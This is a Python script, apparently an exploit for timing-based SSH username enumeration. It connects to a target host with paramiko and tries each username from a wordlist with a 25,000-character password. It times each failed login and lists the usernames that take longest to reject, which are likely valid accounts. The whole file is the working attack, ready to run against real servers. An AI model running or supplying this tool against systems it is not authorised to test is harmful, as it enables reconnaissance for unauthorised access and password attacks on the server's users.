#!/usr/bin/python

import operator
import time
import sys
from argparse import ArgumentParser

import paramiko

parser = ArgumentParser()
parser.add_argument("-w", "--wordlist", metavar="path", default="wordlist.txt",
                    help="Wordlist with usernames")

parser.add_argument("-c", "--count", metavar="number", default=10,
                    help="Limit output to x items")

parser.add_argument('rhost',
                    help="Target address")
parser.add_argument("-v", "--verbose", action="store_true",
                    help="Verbose")

args = parser.parse_args()

#print(args)

p = 'A' * 25000
res = {}
wordlist = args.wordlist
ip = args.rhost
verbose = args.verbose
limit = int(args.count)
ln = 1
lines = sum(1 for line in open(wordlist))

if not (verbose):
    sys.stdout.write("\r0%")
    sys.stdout.flush()
#'\r\n', '\n'
for user in open(wordlist):
    ssh = paramiko.SSHClient()
    starttime = time.clock()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    if "\r" in user: user = user.replace('\r\n', '\n')

    perc = (float(ln)/float(lines))*100

    try:
        ssh.connect(ip, username=user,
                    password=p)
    except:
        endtime = time.clock()
    total = endtime - starttime

    res[user] = total
    ln += 1

    if verbose:
        print(" Username: %s Time: %s Done: %d%%" % (user[0:-1], total, perc))
    else:
        sys.stdout.write("\r%d%%" % perc)
        sys.stdout.flush()


ressorted = sorted(res.items(), key=operator.itemgetter(1))

print;

c = 0
if verbose: print("\nSorted:\n")
# print(c)
# print(limit)
for x, y in ressorted:

    if (c < limit):
        #       print("%s  %s" % (c, limit))
        print("%s %s" % (x[0:-1], y))
        c += 1
    else:
        break
